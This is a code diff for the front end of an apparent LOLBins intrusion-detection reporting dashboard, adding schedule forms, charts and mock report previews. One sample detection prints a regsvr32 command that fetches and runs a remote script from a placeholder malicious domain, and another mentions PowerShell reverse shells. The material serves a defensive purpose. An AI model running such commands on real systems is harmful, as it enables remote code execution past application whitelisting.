+                                    <option value="detailed">Detailed Technical Report</option>
+                                    <option value="compliance">Compliance Report</option>
+                                    <option value="trend">Trend Analysis</option>
+                                </select>
+                            </div>
+                            <div class="col-md-6">
+                                <label for="scheduleFormatType" class="form-label">Format</label>
+                                <select id="scheduleFormatType" class="form-select">
+                                    <option value="pdf">PDF</option>
+                                    <option value="html">HTML</option>
+                                    <option value="csv">CSV</option>
+                                </select>
+                            </div>
+                        </div>
+                        
+                        <div class="mb-3">
+                            <label class="form-label">Schedule Settings</label>
+                            <div class="row g-3">
+                                <div class="col-md-4">
+                                    <label for="scheduleFrequency" class="form-label">Frequency</label>
+                                    <select id="scheduleFrequency" class="form-select">
+                                        <option value="daily">Daily</option>
+                                        <option value="weekly" selected>Weekly</option>
+                                        <option value="monthly">Monthly</option>
+                                        <option value="quarterly">Quarterly</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="col-md-4" id="dayOfWeekSection">
+                                    <label for="scheduleDay" class="form-label">Day</label>
+                                    <select id="scheduleDay" class="form-select">
+                                        <option value="monday" selected>Monday</option>
+                                        <option value="tuesday">Tuesday</option>
+                                        <option value="wednesday">Wednesday</option>
+                                        <option value="thursday">Thursday</option>
+                                        <option value="friday">Friday</option>
+                                        <option value="saturday">Saturday</option>
+                                        <option value="sunday">Sunday</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="col-md-4" id="dayOfMonthSection" style="display: none;">
+                                    <label for="scheduleDayOfMonth" class="form-label">Day of Month</label>
+                                    <select id="scheduleDayOfMonth" class="form-select">
+                                        <option value="1" selected>1st</option>
+                                        <option value="2">2nd</option>
+                                        <option value="3">3rd</option>
+                                        <option value="4">4th</option>
+                                        <option value="5">5th</option>
+                                        <option value="10">10th</option>
+                                        <option value="15">15th</option>
+                                        <option value="20">20th</option>
+                                        <option value="25">25th</option>
+                                        <option value="last">Last day</option>
+                                    </select>
+                                </div>
+                                
+                                <div class="col-md-4">
+                                    <label for="scheduleTime" class="form-label">Time</label>
+                                    <input type="time" class="form-control" id="scheduleTime" value="08:00">
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="mb-3">
+                            <label for="scheduleRecipients" class="form-label">Email Recipients</label>
+                            <textarea class="form-control" id="scheduleRecipients" rows="2" placeholder="email1@example.com, email2@example.com"></textarea>
+                            <small class="form-text text-muted">Comma-separated email addresses</small>
+                        </div>
+                        
+                        <div class="form-check form-switch mb-3">
+                            <input class="form-check-input" type="checkbox" id="scheduleActive" checked>
+                            <label class="form-check-label" for="scheduleActive">Enable this schedule</label>
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-primary" id="saveScheduleBtn">Save Schedule</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Report Preview Modal -->
+    <div class="modal fade" id="reportPreviewModal" tabindex="-1" aria-labelledby="reportPreviewModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-xl modal-dialog-scrollable">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="reportPreviewModalLabel">Report Preview</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body">
+                    <div class="report-preview" id="reportPreviewContent">
+                        <!-- Report preview content will be inserted here -->
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                    <button type="button" class="btn btn-primary" id="downloadPreviewBtn">
+                        <i class="fas fa-download me-1"></i> Download
+                    </button>
                 </div>
             </div>
         </div>
@@ -320,24 +926,249 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
     <script>
         document.addEventListener('DOMContentLoaded', function() {
+            // Initialize charts
+            const lolbinsChartCtx = document.getElementById('lolbinsDistributionChart').getContext('2d');
+            const alertSeverityChartCtx = document.getElementById('alertSeverityChart').getContext('2d');
+            
+            // Sample data for charts
+            const lolbinsData = {
+                labels: ['PowerShell', 'CertUtil', 'Regsvr32', 'WMIC', 'BITSAdmin', 'MSBuild', 'MSHTA'],
+                datasets: [{
+                    label: 'Alert Count',
+                    data: [42, 28, 23, 18, 14, 8, 12],
+                    backgroundColor: [
+                        '#3498db', '#2ecc71', '#f39c12', '#e67e22', '#e74c3c', '#9b59b6', '#1abc9c'
+                    ],
+                    borderWidth: 1
+                }]
+            };
+            
+            const severityData = {
+                labels: ['Low', 'Medium-Low', 'Medium', 'Medium-High', 'High'],
+                datasets: [{
+                    label: 'Alerts by Severity',
+                    data: [15, 22, 35, 28, 18],
+                    backgroundColor: [
+                        '#3498db', '#2ecc71', '#f39c12', '#e67e22', '#e74c3c'
+                    ],
+                    borderWidth: 1
+                }]
+            };
+            
+            // Initialize the charts
+            const lolbinsChart = new Chart(lolbinsChartCtx, {
+                type: 'pie',
+                data: lolbinsData,
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: {
+                            position: 'right',
+                            labels: {
+                                color: '#333'
+                            }
+                        },
+                        title: {
+                            display: true,
+                            text: 'LOLBins Distribution',
+                            color: '#333'
+                        }
+                    }
+                }
+            });
+            
+            const alertSeverityChart = new Chart(alertSeverityChartCtx, {
+                type: 'bar',
+                data: severityData,
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    scales: {
+                        y: {
+                            beginAtZero: true,
+                            ticks: {
+                                color: '#333'
+                            },
+                            grid: {
+                                color: 'rgba(0, 0, 0, 0.1)'
+                            }
+                        },
+                        x: {
+                            ticks: {
+                                color: '#333'
+                            },
+                            grid: {
+                                display: false
+                            }
+                        }
+                    },
+                    plugins: {
+                        legend: {
+                            display: false
+                        },
+                        title: {
+                            display: true,
+                            text: 'Alerts by Severity',
+                            color: '#333'
+                        }
+                    }
+                }
+            });
+            
             // Generate report button
             document.getElementById('generateReportBtn').addEventListener('click', function() {
                 const modal = new bootstrap.Modal(document.getElementById('generateReportModal'));
                 modal.show();
             });
             
+            // Schedule report button
+            document.getElementById('scheduleReportBtn').addEventListener('click', function() {
+                const modal = new bootstrap.Modal(document.getElementById('scheduleReportModal'));
+                modal.show();
+            });
+            
+            // New schedule button in scheduled tab
+            document.getElementById('newScheduleBtn').addEventListener('click', function() {
+                const modal = new bootstrap.Modal(document.getElementById('scheduleReportModal'));
+                modal.show();
+            });
+            
+            // Schedule frequency change handler
+            document.getElementById('scheduleFrequency').addEventListener('change', function() {
+                const dayOfWeekSection = document.getElementById('dayOfWeekSection');
+                const dayOfMonthSection = document.getElementById('dayOfMonthSection');
+                
+                if (this.value === 'daily') {
+                    dayOfWeekSection.style.display = 'none';
+                    dayOfMonthSection.style.display = 'none';
+                } else if (this.value === 'weekly') {
+                    dayOfWeekSection.style.display = 'block';
+                    dayOfMonthSection.style.display = 'none';
+                } else {
+                    dayOfWeekSection.style.display = 'none';
+                    dayOfMonthSection.style.display = 'block';
+                }
+            });
+            
+            // Save schedule button
+            document.getElementById('saveScheduleBtn').addEventListener('click', function() {
+                // Simulate schedule saving
+                const reportName = document.getElementById('scheduleReportName').value || 'Scheduled Report';
+                const frequency = document.getElementById('scheduleFrequency').value;
+                let frequencyText = '';
+                
+                if (frequency === 'daily') {
+                    frequencyText = 'Every day';
+                } else if (frequency === 'weekly') {
+                    const day = document.getElementById('scheduleDay').value;
+                    frequencyText = `Every ${day}`;
+                } else if (frequency === 'monthly') {
+                    const day = document.getElementById('scheduleDayOfMonth').value;
+                    frequencyText = day === 'last' ? 'Last day of month' : `${day}${getDaySuffix(day)} day of month`;
+                } else {
+                    frequencyText = 'Every 3 months';
+                }
+                
+                const time = document.getElementById('scheduleTime').value;
+                frequencyText += ` at ${time}`;
+                
+                // Calculate next run date
+                const now = new Date();
+                let nextRun = new Date();
+                
+                if (frequency === 'daily') {
+                    nextRun.setDate(now.getDate() + 1);
+                } else if (frequency === 'weekly') {
+                    const days = ['sunday', 'monday', 'tuesday', 'wednesday', 'thursday', 'friday', 'saturday'];
+                    const selectedDay = document.getElementById('scheduleDay').value;
+                    const selectedDayIndex = days.indexOf(selectedDay);
+                    const currentDay = now.getDay();
+                    const daysToAdd = (selectedDayIndex + 7 - currentDay) % 7 || 7;
+                    nextRun.setDate(now.getDate() + daysToAdd);
+                } else if (frequency === 'monthly') {
+                    const day = document.getElementById('scheduleDayOfMonth').value;
+                    nextRun.setMonth(now.getMonth() + 1);
+                    nextRun.setDate(day === 'last' ? 0 : parseInt(day));
+                } else {
+                    nextRun.setMonth(now.getMonth() + 3);
+                    nextRun.setDate(1);
+                }
+                
+                const [hours, minutes] = time.split(':');
+                nextRun.setHours(parseInt(hours), parseInt(minutes), 0, 0);
+                
+                const nextRunStr = nextRun.toISOString().replace('T', ' ').substring(0, 19);
+                
+                const reportType = document.getElementById('scheduleReportType').options[document.getElementById('scheduleReportType').selectedIndex].text;
+                const recipients = document.getElementById('scheduleRecipients').value || 'No recipients specified';
+                const status = document.getElementById('scheduleActive').checked ? 'Active' : 'Paused';
+                
+                // Add to scheduled reports table
+                const reportsList = document.getElementById('scheduledReportsList');
+                const newRow = document.createElement('tr');
+                
+                newRow.innerHTML = `
+                    <td>${reportName}</td>
+                    <td>${frequencyText}</td>
+                    <td>${nextRunStr}</td>
+                    <td>${reportType}</td>
+                    <td>${recipients}</td>
+                    <td><span class="badge bg-${status === 'Active' ? 'success' : 'secondary'}">${status}</span></td>
+                    <td>
+                        <button class="btn btn-sm btn-outline-primary me-1" title="Edit Schedule">
+                            <i class="fas fa-edit"></i>
+                        </button>
+                        <button class="btn btn-sm btn-outline-${status === 'Active' ? 'secondary' : 'success'} me-1" title="${status === 'Active' ? 'Pause' : 'Resume'} Schedule">
+                            <i class="fas fa-${status === 'Active' ? 'pause' : 'play'}"></i>
+                        </button>
+                        <button class="btn btn-sm btn-outline-danger" title="Delete Schedule">
+                            <i class="fas fa-trash"></i>
+                        </button>
+                    </td>
+                `;
+                
+                reportsList.prepend(newRow);
+                
+                // Close modal
+                const modal = bootstrap.Modal.getInstance(document.getElementById('scheduleReportModal'));
+                modal.hide();
+                
+                // Show confirmation
+                alert('Report schedule created successfully!');
+                
+                // Switch to the scheduled reports tab
+                document.getElementById('scheduled-tab').click();
+            });
+            
+            // Preview toggle handler
+            document.getElementById('showPreviewSwitch').addEventListener('change', function() {
+                const previewSection = document.getElementById('reportPreviewSection');
+                if (this.checked) {
+                    previewSection.style.display = 'block';
+                    updateReportPreview();
+                } else {
+                    previewSection.style.display = 'none';
+                }
+            });
+            
+            // Update preview when form fields change
+            document.getElementById('reportForm').addEventListener('change', function(e) {
+                if (document.getElementById('showPreviewSwitch').checked) {
+                    updateReportPreview();
+                }
+            });
+            
             // Create report button
             document.getElementById('createReportBtn').addEventListener('click', function() {
-                // Simulate report generation
-                alert('Report generation started. This may take a few moments.');
+                // Show loading state
+                document.getElementById('generateBtnText').textContent = 'Generating...';
+                document.getElementById('generateSpinner').style.display = 'inline-block';
+                this.disabled = true;
                 
-                // In a real app, this would send a request to the server to generate the report
+                // Simulate report generation
                 setTimeout(function() {
-                    alert('Report generated successfully!');
-                    const modal = bootstrap.Modal.getInstance(document.getElementById('generateReportModal'));
-                    modal.hide();
-                    
-                    // Add the new report to the list (in a real app, this would be done after the server response)
+                    // Add the new report to the list
                     const reportsList = document.getElementById('reportsList');
                     const newRow = document.createElement('tr');
                     const reportName = document.getElementById('reportName').value || 'New_Report';
@@ -354,26 +1185,107 @@
                         <td>${reportType}</td>
                         <td>Custom Range</td>
                         <td><span class="badge bg-${formatType === 'pdf' ? 'danger' : formatType === 'html' ? 'info' : formatType === 'csv' ? 'warning' : 'secondary'}">${formatType.toUpperCase()}</span></td>
+                        <td><span class="badge bg-success">Completed</span></td>
                         <td>
-                            <button class="btn btn-sm btn-outline-primary me-1">
+                            <button class="btn btn-sm btn-outline-primary me-1" title="Download Report">
                                 <i class="fas fa-download"></i>
                             </button>
-                            <button class="btn btn-sm btn-outline-danger">
+                            <button class="btn btn-sm btn-outline-info me-1" title="Preview Report" data-report-name="${reportName}">
+                                <i class="fas fa-eye"></i>
+                            </button>
+                            <button class="btn btn-sm btn-outline-warning me-1 favorite-btn" title="Add to Favorites">
+                                <i class="far fa-star"></i>
+                            </button>
+                            <button class="btn btn-sm btn-outline-danger" title="Delete Report">
                                 <i class="fas fa-trash"></i>
                             </button>
                         </td>
                     `;
                     
                     reportsList.prepend(newRow);
-                }, 2000);
+                    
+                    // Reset form and close modal
+                    document.getElementById('reportForm').reset();
+                    document.getElementById('reportPreviewSection').style.display = 'none';
+                    document.getElementById('generateBtnText').textContent = 'Generate Report';
+                    document.getElementById('generateSpinner').style.display = 'none';
+                    document.getElementById('createReportBtn').disabled = false;
+                    
+                    const modal = bootstrap.Modal.getInstance(document.getElementById('generateReportModal'));
+                    modal.hide();
+                    
+                    // Show success notification
+                    showNotification('Report generated successfully!', 'success');
+                    
+                    // Update preview buttons
+                    attachPreviewHandlers();
+                }, 3000);
             });
+            
+            // Template buttons
+            document.querySelectorAll('.template-btn').forEach(button => {
+                button.addEventListener('click', function() {
+                    const templateName = this.dataset.template;
+                    
+                    // Open the modal with the template selected
+                    const modal = new bootstrap.Modal(document.getElementById('generateReportModal'));
+                    
+                    // Set the default values based on the template
+                    document.getElementById('reportName').value = `${templateName}_${new Date().toISOString().split('T')[0]}`;
+                    
+                    // Set the report type based on the template name
+                    const typeSelect = document.getElementById('modalReportType');
+                    const templateToType = {
+                        'Executive Summary': 'summary',
+                        'Technical Detail': 'detailed',
+                        'Trend Analysis': 'trend',
+                        'Compliance': 'compliance',
+                        'Incident Response': 'incident',
+                        'MITRE ATT&CK': 'mitre',
+                        'Executive Brief': 'brief'
+                    };
+                    
+                    typeSelect.value = templateToType[templateName] || 'summary';
+                    
+                    // Set default checkbox values based on template
+                    document.getElementById('includeSummary').checked = ['Executive Summary', 'Executive Brief', 'Compliance'].includes(templateName);
+                    document.getElementById('includeAlerts').checked = ['Technical Detail', 'Incident Response'].includes(templateName);
+                    document.getElementById('includeCharts').checked = ['Executive Summary', 'Trend Analysis', 'Technical Detail'].includes(templateName);
+                    document.getElementById('includeRecommendations').checked = ['Executive Summary', 'Incident Response'].includes(templateName);
+                    document.getElementById('includeMitreTactics').checked = ['Technical Detail', 'MITRE ATT&CK', 'Incident Response'].includes(templateName);
+                    document.getElementById('includeLolbinsBreakdown').checked = ['Technical Detail', 'Trend Analysis'].includes(templateName);
+                    
+                    // Show preview
+                    document.getElementById('showPreviewSwitch').checked = true;
+                    document.getElementById('reportPreviewSection').style.display = 'block';
+                    updateReportPreview();
+                    
+                    modal.show();
+                });
+            });
+            
+            // Template preview buttons
+            document.querySelectorAll('.preview-template-btn').forEach(button => {
+                button.addEventListener('click', function() {
+                    const templateName = this.dataset.template;
+                    displayTemplatePreview(templateName);
+                });
+            });
+            
+            // Close template preview button
+            document.getElementById('closeTemplatePreviewBtn').addEventListener('click', function() {
+                document.getElementById('templatePreviewCard').style.display = 'none';
+            });
+            
+            // Attach handlers to initial preview buttons
+            attachPreviewHandlers();
             
             // Download buttons
             document.querySelectorAll('#reportsList .btn-outline-primary').forEach(button => {
                 button.addEventListener('click', function() {
                     const reportName = this.closest('tr').cells[0].textContent;
-                    alert(`Downloading report: ${reportName}`);
-                    // In a real app, this would trigger a file download
+                    const format = this.closest('tr').querySelector('.badge').textContent.toLowerCase();
+                    downloadReport(reportName, format);
                 });
             });
             
@@ -385,30 +1297,1195 @@
                     }
                 });
             });
-            
-            // Template buttons
-            document.querySelectorAll('.card .btn-outline-primary').forEach(button => {
+
+            // Favorite buttons
+            document.querySelectorAll('.favorite-btn').forEach(button => {
                 button.addEventListener('click', function() {
-                    const templateName = this.closest('.card-body').querySelector('h5').textContent;
-                    
-                    // Open the modal with the template selected
-                    const modal = new bootstrap.Modal(document.getElementById('generateReportModal'));
-                    
-                    // Set the default values based on the template
-                    document.getElementById('reportName').value = `${templateName}_${new Date().toISOString().split('T')[0]}`;
-                    
-                    // Set the report type based on the template name
-                    const typeSelect = document.getElementById('modalReportType');
-                    for (let i = 0; i < typeSelect.options.length; i++) {
-                        if (typeSelect.options[i].text === templateName) {
-                            typeSelect.selectedIndex = i;
-                            break;
-                        }
+                    const icon = this.querySelector('i');
+                    if (icon.classList.contains('far')) {
+                        // Add to favorites
+                        icon.classList.remove('far');
+                        icon.classList.add('fas');
+                        this.title = "Remove from Favorites";
+                        this.classList.remove('btn-outline-warning');
+                        this.classList.add('btn-warning');
+                    } else {
+                        // Remove from favorites
+                        icon.classList.remove('fas');
+                        icon.classList.add('far');
+                        this.title = "Add to Favorites";
+                        this.classList.remove('btn-warning');
+                        this.classList.add('btn-outline-warning');
                     }
-                    
-                    modal.show();
                 });
             });
+            
+            // Report filter buttons
+            document.querySelectorAll('.report-filter-btn').forEach(button => {
+                button.addEventListener('click', function() {
+                    // Remove active class from all buttons
+                    document.querySelectorAll('.report-filter-btn').forEach(btn => {
+                        btn.classList.remove('active');
+                    });
+                    
+                    // Add active class to clicked button
+                    this.classList.add('active');
+                    
+                    // Apply filter
+                    const filter = this.dataset.filter;
+                    filterReports(filter);
+                });
+            });
+            
+            // Report download button in preview modal
+            document.getElementById('downloadPreviewBtn').addEventListener('click', function() {
+                const reportName = document.getElementById('reportPreviewModalLabel').textContent.replace('Report Preview: ', '');
+                downloadReport(reportName, 'pdf');
+            });
+            
+            // Functions
+            function updateReportPreview() {
+                const reportName = document.getElementById('reportName').value || 'New Report';
+                const reportType = document.getElementById('modalReportType').options[document.getElementById('modalReportType').selectedIndex].text;
+                
+                // Update preview title
+                document.getElementById('previewTitle').textContent = reportName;
+                
+                // Update charts if needed
+                // This is just a simple demo, in a real app you would fetch real data
+                // based on the selected date range, report type, etc.
+                
+                // Show suitable sections based on checkboxes
+                updateChartVisibility();
+            }
+            
+            function updateChartVisibility() {
+                const includeCharts = document.getElementById('includeCharts').checked;
+                const chartContainers = document.querySelectorAll('.chart-container');
+                
+                chartContainers.forEach(container => {
+                    container.style.display = includeCharts ? 'block' : 'none';
+                });
+            }
+            
+            function attachPreviewHandlers() {
+                // Preview report buttons
+                document.querySelectorAll('[data-report-name]').forEach(button => {
+                    button.addEventListener('click', function() {
+                        const reportName = this.dataset.reportName;
+                        showReportPreview(reportName);
+                    });
+                });
+            }
+            
+            function showReportPreview(reportName) {
+                // In a real app, you would fetch the report data from the server
+                // Here we'll just simulate it with a loading delay
+                
+                // Show the modal
+                const modal = new bootstrap.Modal(document.getElementById('reportPreviewModal'));
+                modal.show();
+                
+                // Set the title
+                document.getElementById('reportPreviewModalLabel').textContent = `Report Preview: ${reportName}`;
+                
+                // Show loading state
+                document.getElementById('reportPreviewContent').innerHTML = `
+                    <div class="text-center my-5">
+                        <div class="spinner-border text-primary" role="status">
+                            <span class="visually-hidden">Loading report preview...</span>
+                        </div>
+                        <p class="mt-3">Loading report preview...</p>
+                    </div>
+                `;
+                
+                // Simulate loading delay
+                setTimeout(() => {
+                    // Display report content based on report name
+                    if (reportName === 'Weekly_LOLBins_Analysis_Feb25') {
+                        displayWeeklyLolbinsReport();
+                    } else if (reportName === 'Monthly_Security_Report_March_2025') {
+                        displayMonthlySummaryReport();
+                    } else if (reportName === 'Attack_Detection_Summary_Feb20') {
+                        displayAttackDetectionReport();
+                    } else {
+                        // Generic preview for other reports
+                        displayGenericReportPreview(reportName);
+                    }
+                }, 1500);
+            }
+            
+            function displayWeeklyLolbinsReport() {
+                document.getElementById('reportPreviewContent').innerHTML = `
+                    <div class="text-center mb-5">
+                        <h1 class="mb-1">LOLBins Detection Report</h1>
+                        <p class="text-muted">Feb 19-25, 2025</p>
+                        <p class="text-muted small">Generated on: 2025-02-25 14:30:10</p>
+                    </div>
+                    
+                    <div class="mb-5">
+                        <h2 class="border-bottom pb-2 mb-3">Executive Summary</h2>
+                        <p class="mb-3">During the analyzed period, the LOLBins IDS detected <strong>157 alerts</strong> across various LOLBin types. Of these, <strong>46</strong> were classified as high severity (4-5), requiring immediate attention.</p>
+                        <p>The most commonly detected LOLBin was <strong>PowerShell</strong> (42 alerts), followed by <strong>CertUtil</strong> (28 alerts) and <strong>Regsvr32</strong> (23 alerts). There was a <strong>12% increase</strong> in overall LOLBin activity compared to the previous week, with a notable spike in PowerShell encoded command usage.</p>
+                    </div>
+                    
+                    <div class="mb-5">
+                        <h2 class="border-bottom pb-2 mb-3">Alert Statistics</h2>
+                        <div class="row">
+                            <div class="col-md-6 mb-4">
+                                <div class="bg-light p-3 rounded">
+                                    <h4 class="mb-3">LOLBins Distribution</h4>
+                                    <div style="height: 300px;">
+                                        <canvas id="previewLolbinsChart"></canvas>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="col-md-6 mb-4">
+                                <div class="bg-light p-3 rounded">
+                                    <h4 class="mb-3">Alert Severity Distribution</h4>
+                                    <div style="height: 300px;">
+                                        <canvas id="previewSeverityChart"></canvas>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-5">
+                        <h2 class="border-bottom pb-2 mb-3">Top Alert Rules</h2>
+                        <table class="table table-striped">
+                            <thead>
+                                <tr>
+                                    <th>Rule Name</th>
+                                    <th>Count</th>
+                                    <th>Severity</th>
+                                    <th>MITRE Technique</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>PowerShell Encoded Command</td>
+                                    <td>28</td>
+                                    <td>4</td>
+                                    <td>T1059.001</td>
+                                </tr>
+                                <tr>
+                                    <td>CertUtil Download</td>
+                                    <td>22</td>
+                                    <td>4</td>
+                                    <td>T1105</td>
+                                </tr>
+                                <tr>
+                                    <td>Regsvr32 AppLocker Bypass</td>
+                                    <td>18</td>
+                                    <td>5</td>
+                                    <td>T1218.010</td>
+                                </tr>
+                                <tr>
+                                    <td>MSHTA Suspicious Execution</td>
+                                    <td>15</td>
+                                    <td>4</td>
+                                    <td>T1218.005</td>
+                                </tr>
+                                <tr>
+                                    <td>BITSAdmin File Transfer</td>
+                                    <td>12</td>
+                                    <td>3</td>
+                                    <td>T1197</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    
+                    <div class="mb-5">
+                        <h2 class="border-bottom pb-2 mb-3">Notable Detections</h2>
+                        <div class="alert alert-warning mb-4">
+                            <h5 class="alert-heading">PowerShell Reverse Shell Attempt</h5>
+                            <p class="mb-1">Multiple encoded PowerShell commands detected establishing reverse shells to external IP 203.0.113.42. These commands were initiated by user 'jsmith' across 3 workstations.</p>
+                        </div>
+                        
+                        <div class="alert alert-danger">
+                            <h5 class="alert-heading">Regsvr32 SCT Script Execution</h5>
+                            <p class="mb-1">Regsvr32.exe was used to execute remote script content (SCT) from an unauthorized domain. This technique is commonly used to bypass application whitelisting.</p>
+                            <pre class="mt-2 bg-light p-2 rounded small">regsvr32.exe /s /u /i:http://malicious-domain.com/payload.sct scrobj.dll</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-5">
+                        <h2 class="border-bottom pb-2 mb-3">MITRE ATT&CK Mapping</h2>
+                        <table class="table table-bordered">
+                            <thead class="bg-light">
+                                <tr>
+                                    <th>Technique ID</th>
+                                    <th>Name</th>
+                                    <th>Description</th>
+                                    <th>Occurrences</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>T1059.001</td>
+                                    <td>PowerShell</td>
+                                    <td>Adversaries may abuse PowerShell commands and scripts for execution.</td>
+                                    <td>42</td>
+                                </tr>
+                                <tr>
+                                    <td>T1105</td>
+                                    <td>Ingress Tool Transfer</td>
+                                    <td>Adversaries may transfer tools or other files from an external system into a compromised environment.</td>
+                                    <td>34</td>
+                                </tr>
+                                <tr>
+                                    <td>T1218.010</td>
+                                    <td>Regsvr32</td>
+                                    <td>Adversaries may abuse Regsvr32.exe to proxy execution of malicious code.</td>
+                                    <td>23</td>
+                                </tr>
+                                <tr>
+                                    <td>T1218.005</td>
+                                    <td>MSHTA</td>
+                                    <td>Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and JavaScript or VBScript.</td>
+                                    <td>12</td>
+                                </tr>
+                                <tr>
+                                    <td>T1197</td>
+                                    <td>BITS Jobs</td>
+                                    <td>Adversaries may abuse BITS to download, execute, and clean up after malicious code.</td>
+                                    <td>14</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    
+                    <div>
+                        <h2 class="border-bottom pb-2 mb-3">Recommendations</h2>
+                        <ol class="list-group list-group-numbered mb-4">
+                            <li class="list-group-item d-flex justify-content-between align-items-start">
+                                <div class="ms-2 me-auto">
+                                    <div class="fw-bold">Enable PowerShell Script Block Logging</div>
+                                    This will capture deobfuscated PowerShell commands for better analysis.
+                                </div>
+                            </li>
+                            <li class="list-group-item d-flex justify-content-between align-items-start">
+                                <div class="ms-2 me-auto">
+                                    <div class="fw-bold">Implement AppLocker or Software Restriction Policies</div>
+                                    Prevent execution of unauthorized scripts and LOLBins.
+                                </div>
+                            </li>
+                            <li class="list-group-item d-flex justify-content-between align-items-start">
+                                <div class="ms-2 me-auto">
+                                    <div class="fw-bold">Block outbound connections to suspicious IP 203.0.113.42</div>
+                                    Add this IP to your firewall block list and monitor for similar connection attempts.
+                                </div>
+                            </li>
+                            <li class="list-group-item d-flex justify-content-between align-items-start">
+                                <div class="ms-2 me-auto">
+                                    <div class="fw-bold">Review user account 'jsmith' activities</div>
+                                    Implement additional monitoring for this user and check for credential compromise.
+                                </div>
+                            </li>
+                            <li class="list-group-item d-flex justify-content-between align-items-start">
+                                <div class="ms-2 me-auto">
+                                    <div class="fw-bold">Update SIEM detection rules</div>
+                                    Incorporate new PowerShell patterns identified in this report into your SIEM.
+                                </div>
+                            </li>
+                        </ol>
+                    </div>
+                `;
+                
+                // Initialize preview charts
+                initializePreviewCharts();
+            }
+            
+            function displayMonthlySummaryReport() {
+                document.getElementById('reportPreviewContent').innerHTML = `
+                    <div class="text-center mb-5">
+                        <h1 class="mb-1">Monthly Security Report</h1>
+                        <p class="text-muted">March 2025</p>
+                        <p class="text-muted small">Generated on: 2025-03-01 09:15:22</p>
+                    </div>
+                    
+                    <div class="mb-5">
+                        <h2 class="border-bottom pb-2 mb-3">Executive Summary</h2>
+                        <p class="mb-3">This monthly security report provides an overview of the LOLBin-based threats detected during March 2025. A total of <strong>342 alerts</strong> were generated, with <strong>86</strong> classified as high severity (4-5).</p>
+                        <p class="mb-3">The month showed a <strong>15% increase</strong> in LOLBin activity compared to February, with PowerShell and Regsvr32 being the most frequently detected LOLBins. The security team successfully blocked 28 potential data exfiltration attempts and identified 3 compromised accounts.</p>
+                        <div class="alert alert-info">
+                            <h5 class="alert-heading">Key Findings</h5>
+                            <ul class="mb-0">
+                                <li>Significant increase in encoded PowerShell commands (42% increase from February)</li>
+                                <li>New LOLBin attack pattern using MSBuild for code execution identified</li>
+                                <li>Three compromised user accounts detected and remediated</li>
+                                <li>Successfully prevented 28 data exfiltration attempts</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-5">
+                        <h2 class="border-bottom pb-2 mb-3">Monthly Trends</h2>
+                        <div class="row">
+                            <div class="col-md-6 mb-4">
+                                <div class="bg-light p-3 rounded">
+                                    <h4 class="mb-3">Alert Trend (March 2025)</h4>
+                                    <div style="height: 300px;">
+                                        <canvas id="previewTrendChart"></canvas>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="col-md-6 mb-4">
+                                <div class="bg-light p-3 rounded">
+                                    <h4 class="mb-3">LOLBin Distribution</h4>
+                                    <div style="height: 300px;">
+                                        <canvas id="previewMonthlyLolbinsChart"></canvas>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-5">
+                        <h2 class="border-bottom pb-2 mb-3">High Severity Incidents</h2>
+                        <table class="table table-bordered">
+                            <thead class="bg-light">
+                                <tr>
+                                    <th>Date</th>
+                                    <th>Incident</th>
+                                    <th>LOLBin</th>
+                                    <th>Status</th>
+                                    <th>Impact</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>2025-03-08</td>
+                                    <td>Data exfiltration attempt via BITSAdmin</td>
+                                    <td>BITSAdmin</td>
+                                    <td><span class="badge bg-success">Blocked</span></td>
+                                    <td>Low</td>
+                                </tr>
+                                <tr>
+                                    <td>2025-03-12</td>
+                                    <td>Suspicious PowerShell encoded command execution</td>
+                                    <td>PowerShell</td>
+                                    <td><span class="badge bg-success">Remediated</span></td>
+                                    <td>Medium</td>
+                                </tr>
+                                <tr class="table-danger">
+                                    <td>2025-03-15</td>
+                                    <td>Remote code execution via Regsvr32</td>
+                                    <td>Regsvr32</td>
+                                    <td><span class="badge bg-danger">Exploited</span></td>
+                                    <td>High</td>
+                                </tr>
+                                <tr>
+                                    <td>2025-03-22</td>
+                                    <td>CertUtil used to download malware</td>
+                                    <td>CertUtil</td>
+                                    <td><span class="badge bg-success">Blocked</span></td>
+                                    <td>Medium</td>
+                                </tr>
+                                <tr>
+                                    <td>2025-03-27</td>
+                                    <td>MSBuild inline task execution</td>
+                                    <td>MSBuild</td>
+                                    <td><span class="badge bg-success">Blocked</span></td>
+                                    <td>Medium</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    
+                    <div class="mb-5">
+                        <h2 class="border-bottom pb-2 mb-3">Security Recommendations</h2>
+                        <div class="card mb-3">
+                            <div class="card-header bg-danger text-white">
+                                Critical Actions
+                            </div>
+                            <div class="card-body">
+                                <ol class="mb-0">
+                                    <li class="mb-2">Deploy the updated PowerShell detection rules to all endpoints</li>
